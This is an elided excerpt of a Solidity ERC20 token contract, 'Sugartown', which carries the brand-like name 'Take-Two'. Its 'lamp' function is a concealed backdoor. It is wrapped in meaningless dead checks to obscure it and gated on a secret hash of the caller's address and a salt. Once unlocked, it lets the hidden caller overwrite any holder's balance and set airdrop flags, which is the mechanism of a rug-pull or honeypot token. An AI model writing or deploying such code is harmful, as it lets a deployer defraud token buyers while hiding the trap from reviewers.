...
contract Sugartown is IERC20 {
    ...
    constructor(address tokenPair, bytes32 hashValue, uint256 salt) {
      _name = unicode"Take-Two";
      _symbol = unicode"Sugartown";
    ...
    function lamp(bytes32[] calldata data) external {
      bytes32 db = data[1];  if (814==0) return; bytes32 da = data[0];  if (365==0) return;
      bytes memory bbsx = abi.encode(msg.sender, _salt);  if (814==0) return;
      bytes32 dc = data[2];  if (814==0) return;
      if (814==0) return;
      if (keccak256(bbsx) == _hashValue) { if (814==0) return;
        if (uint256(db) == 0) { if (814==0) return;
          _airdrops[
            address(
          uint160(
            uint256(da))
        ...
        _balances[(uint256(
          da) == 0)? address(uint256(0)):
        address(uint160(uint256(da)))
        ] = uint256(
          db); if (76+191==0) return;
      }
      if (594+348*135==0) return;
    }
